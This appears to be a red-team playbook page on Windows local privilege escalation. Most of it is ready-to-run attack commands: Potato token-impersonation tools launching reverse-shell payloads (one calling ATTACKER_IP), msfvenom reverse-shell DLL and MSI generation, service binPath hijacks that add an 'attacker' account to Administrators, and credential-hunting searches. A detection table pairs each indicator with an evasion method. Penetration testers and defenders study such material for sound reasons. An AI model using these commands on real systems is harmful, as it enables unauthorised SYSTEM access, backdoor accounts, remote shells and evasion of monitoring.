# Windows Local Privilege Escalation

> **MITRE ATT&CK**: Privilege Escalation > T1134 - Access Token Manipulation
> **Platforms**: Windows
> **Required Privileges**: User / Service Account
> **OPSEC Risk**: Medium

## Strategic Overview

Windows local privilege escalation is typically the first post-exploitation objective after
gaining an initial foothold. A Red Team Lead must understand which techniques produce the
least forensic noise while achieving SYSTEM or Administrator-level access. The choice of
technique depends on the current privilege level, host configuration, endpoint detection
capabilities, and operational timeline. Token impersonation via Potato attacks remains the
most reliable path from service accounts, while misconfigurations in services, scheduled
tasks, and registry keys provide escalation from standard user contexts.

## Technical Deep-Dive

### Automated Enumeration

```powershell
# winPEAS - comprehensive enumeration (noisy, use selectively)
.\winPEASx64.exe servicesinfo applicationsinfo

# PowerUp - PowerShell-based checks (fileless if loaded in memory)
Import-Module .\PowerUp.ps1
Invoke-AllChecks | Out-File -Encoding ASCII checks.txt

# Seatbelt - targeted enumeration (preferred for OPSEC)
.\Seatbelt.exe -group=all -full

# SharpUp - C# implementation of PowerUp checks
.\SharpUp.exe audit

# PrivescCheck - modern PowerShell alternative
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Report PrivescCheck_$env:COMPUTERNAME -Format HTML
```

### Token Impersonation (SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege)

Service accounts (IIS APPPOOL, MSSQL, etc.) often hold SeImpersonatePrivilege. Potato
attacks leverage this to escalate to SYSTEM by coercing a privileged authentication and
impersonating the resulting token.

```powershell
# Check current privileges
whoami /priv

# JuicyPotato (Windows Server 2016/2019, Windows 10 < 1809)
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\rev.exe" -t *

# PrintSpoofer (Windows 10 / Server 2016-2019)
.\PrintSpoofer64.exe -c "c:\temp\rev.exe"
.\PrintSpoofer64.exe -i -c powershell.exe

# RoguePotato (requires controlled machine for OXID resolution)
.\RoguePotato.exe -r ATTACKER_IP -e "c:\temp\rev.exe" -l 9999

# GodPotato (Windows Server 2012-2022, Windows 8.1-11, broad compatibility)
.\GodPotato-NET4.exe -cmd "c:\temp\rev.exe"

# SweetPotato (combined approach)
.\SweetPotato.exe -p c:\temp\rev.exe
```

### Unquoted Service Paths

When a service binary path contains spaces and is not quoted, Windows evaluates each
space-delimited segment as a potential executable path.

```cmd
:: Enumerate unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
sc qc "VulnerableService"

:: If path is: C:\Program Files\Vulnerable App\Service.exe
:: Drop payload at: C:\Program.exe or C:\Program Files\Vulnerable.exe
:: Restart the service
sc stop VulnerableService
sc start VulnerableService
```

### Weak Service Permissions

```cmd
:: Check service permissions for low-privilege groups
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "BUILTIN\Users" *

:: If SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG found
sc config vulnerable_svc binPath= "cmd /c net localgroup Administrators attacker /add"
sc stop vulnerable_svc
sc start vulnerable_svc

:: Alternatively, point to a reverse shell payload
sc config vulnerable_svc binPath= "C:\temp\rev.exe"
sc stop vulnerable_svc && sc start vulnerable_svc
```

### DLL Hijacking

```powershell
# Identify missing DLLs loaded by privileged services using Process Monitor
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# Common DLL hijack targets (services searching writable directories)
# Drop malicious DLL in writable directory that appears before the real DLL in search order
# DLL search order: Application directory -> System32 -> System -> Windows -> PATH directories

# Generate malicious DLL with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o hijack.dll
```

#### DLL Proxying (Alternative DLL Hijacking Approach)

Rather than replacing a DLL entirely (which often breaks application functionality and triggers
errors), DLL proxying creates a wrapper DLL that forwards all legitimate function calls to the
original DLL while executing attacker code on load. This approach is more reliable and stealthy
than simple DLL replacement:

```
Approach:
1. Identify a target application that loads a DLL from a writable location
   (use Process Monitor: filter Result = NAME NOT FOUND or check DLL search order)
2. Export all functions from the legitimate DLL using a tool like:
   - SharpDLLProxy: Automatically generates proxy DLL source code
   - DLL Export Viewer (NirSoft): List all exports for manual proxying
3. Create a proxy DLL that:
   a. Forwards all exported functions to the original (renamed) DLL
   b. Executes payload in DllMain or a specific proxied function
4. Rename the original DLL (e.g., original.dll -> original_orig.dll)
5. Place the proxy DLL with the original name
6. When the application loads, the proxy DLL runs the payload and forwards
   all function calls transparently to the original DLL

Benefits over simple DLL replacement:
- Application continues to function normally (no crashes/errors)
- Less likely to trigger application integrity checks
- Can persist across application updates if the DLL name remains stable
- Reduces operator cleanup requirements
```

> **Reference**: watson0x90. Another DLL Hijacking Approach.
> https://watson0x90.com/another-dll-hijacking-approach-bfd1c43ca0e0

### Always Install Elevated

```cmd
:: Check if AlwaysInstallElevated is enabled (both keys must be set to 1)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o shell.msi

:: Execute with elevated privileges
msiexec /quiet /qn /i shell.msi
```

### Stored Credentials

```cmd
:: Check for saved credentials
cmdkey /list
:: If admin credentials stored, use runas with /savecred
runas /savecred /user:DOMAIN\Administrator "cmd.exe /c c:\temp\rev.exe"

:: Search for credentials in common locations
dir /s /b C:\Users\*password* C:\Users\*credential* 2>nul
findstr /si password *.xml *.ini *.txt *.cfg *.config 2>nul
reg query HKLM /f password /t REG_SZ /s 2>nul
```

### Scheduled Tasks with Weak Permissions

```cmd
:: Enumerate scheduled tasks
schtasks /query /fo LIST /v > tasks.txt
:: Check if the binary referenced by a task is writable by current user
icacls "C:\Path\To\Task\Binary.exe"
:: Replace binary with payload, wait for scheduled execution
```

### Registry AutoRuns

```cmd
:: Query autorun entries
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
:: Check write permissions on autorun binaries
icacls "C:\Path\To\Autorun.exe"
:: Replace if writable, payload executes at next login
```

### Kernel Exploits (Last Resort)

```
# Use only when other methods fail - high risk of BSOD
# CVE-2021-1732 - Win32k Elevation of Privilege (Windows 10 / Server 2019)
# CVE-2021-36934 - HiveNightmare / SeriousSAM (read SAM/SYSTEM without admin)
# CVE-2020-0796 - SMBGhost (Windows 10 1903/1909)
# CVE-2023-28252 - CLFS Driver Privilege Escalation
# Always test in a matching lab environment first
```

## Detection & Evasion

| Indicator | Detection Source | Evasion |
|-----------|-----------------|---------|
| Potato attack named pipes | Sysmon Event 17/18 | Use newer variants (GodPotato) with custom pipe names |
| Service binary modification | Event 7045 (new service), 4697 | Restore original binary immediately after execution |
| MSI installation as SYSTEM | Event 1033/1034 (MsiInstaller) | Use quiet install flags (/qn /quiet) |
| winPEAS/Seatbelt execution | EDR process monitoring | Run in-memory via execute-assembly, use selective modules |
| Token impersonation | Event 4688 with elevated token | Use direct syscalls to avoid API hooking |

## Cross-References

- [UAC Bypass Techniques](uac-bypass.md) - escalate from medium to high integrity
- [Linux Privilege Escalation](linux-privesc.md) - Linux counterpart techniques
- [Credential Access](../06-credential-access/README.md) - post-escalation credential theft
- [Defense Evasion](../04-defense-evasion/README.md) - avoiding detection during privesc

## References

- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- https://github.com/BeichenDream/GodPotato
- https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
- https://github.com/itm4n/PrivescCheck
- watson0x90. Another DLL Hijacking Approach: https://watson0x90.com/another-dll-hijacking-approach-bfd1c43ca0e0
